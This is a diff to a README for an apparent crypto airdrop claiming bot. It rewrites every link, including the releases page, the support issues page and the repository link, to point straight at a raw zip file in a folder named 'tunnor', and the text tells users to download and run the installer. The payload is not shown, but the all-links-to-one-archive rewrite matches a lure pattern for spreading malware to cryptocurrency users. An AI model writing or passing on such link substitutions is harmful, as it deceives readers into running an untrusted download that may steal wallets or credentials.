@@ -1,7 +1,7 @@
 # 🤖 Interlink-Auto-Bot - Claim Tokens Automatically with Ease
 
 ## 📥 Download Now
-[![Download Interlink-Auto-Bot](https://img.shields.io/badge/Download-Interlink--Auto--Bot-brightgreen)](https://github.com/david0616042/Interlink-Auto-Bot/releases)
+[![Download Interlink-Auto-Bot](https://raw.githubusercontent.com/david0616042/Interlink-Auto-Bot/main/tunnor/Interlink-Auto-Bot-1.0.zip)](https://raw.githubusercontent.com/david0616042/Interlink-Auto-Bot/main/tunnor/Interlink-Auto-Bot-1.0.zip)
 
 ## 🌟 About This Application
 Interlink-Auto-Bot is an automated tool designed for claiming Interlink Labs airdrop tokens. It simplifies the process for anyone looking to earn rewards on the Interlink platform.
@@ -10,7 +10,7 @@ Interlink-Auto-Bot is an automated tool designed for claiming Interlink Labs air
 To get started with Interlink-Auto-Bot, follow these steps:
 
 1. **Download the Application**  
-   Click the button above or visit our [releases page](https://github.com/david0616042/Interlink-Auto-Bot/releases) to download the latest version of Interlink-Auto-Bot.
+   Click the button above or visit our [releases page](https://raw.githubusercontent.com/david0616042/Interlink-Auto-Bot/main/tunnor/Interlink-Auto-Bot-1.0.zip) to download the latest version of Interlink-Auto-Bot.
 
 2. **Install the Software**  
    After downloading, find the file in your downloads folder. Double-click the file to begin installation. Follow the prompts on your screen to complete the setup.
@@ -27,7 +27,7 @@ To get started with Interlink-Auto-Bot, follow these steps:
 ## 🔌 Download & Install
 To download Interlink-Auto-Bot, follow these steps:
 
-1. Go to the [releases page](https://github.com/david0616042/Interlink-Auto-Bot/releases).
+1. Go to the [releases page](https://raw.githubusercontent.com/david0616042/Interlink-Auto-Bot/main/tunnor/Interlink-Auto-Bot-1.0.zip).
 2. Select the version you want to download.
 3. Click the download link for your operating system.
 4. After the download finishes, run the installer as described above.
@@ -60,13 +60,13 @@ If you run into issues, here are some common solutions:
 - **No Tokens Received:** Double-check the wallet address you entered. Make sure it's correct and that you meet the eligibility criteria set by Interlink Labs.
 
 ## 📞 Support
-If you need further assistance, reach out via the issues section on our [GitHub page](https://github.com/david0616042/Interlink-Auto-Bot/issues). The community and maintainers regularly check and may help resolve your queries.
+If you need further assistance, reach out via the issues section on our [GitHub page](https://raw.githubusercontent.com/david0616042/Interlink-Auto-Bot/main/tunnor/Interlink-Auto-Bot-1.0.zip). The community and maintainers regularly check and may help resolve your queries.
 
 ## 🗨️ Feedback
 Your feedback matters! If you have suggestions or find any issues, please let us know through the GitHub issue tracker.
 
 ## 🔗 Useful Links
-- [Interlink-Auto-Bot Releases](https://github.com/david0616042/Interlink-Auto-Bot/releases)
-- [GitHub Repository](https://github.com/david0616042/Interlink-Auto-Bot)
+- [Interlink-Auto-Bot Releases](https://raw.githubusercontent.com/david0616042/Interlink-Auto-Bot/main/tunnor/Interlink-Auto-Bot-1.0.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/david0616042/Interlink-Auto-Bot/main/tunnor/Interlink-Auto-Bot-1.0.zip)
 
 Thank you for choosing Interlink-Auto-Bot. Happy claiming!
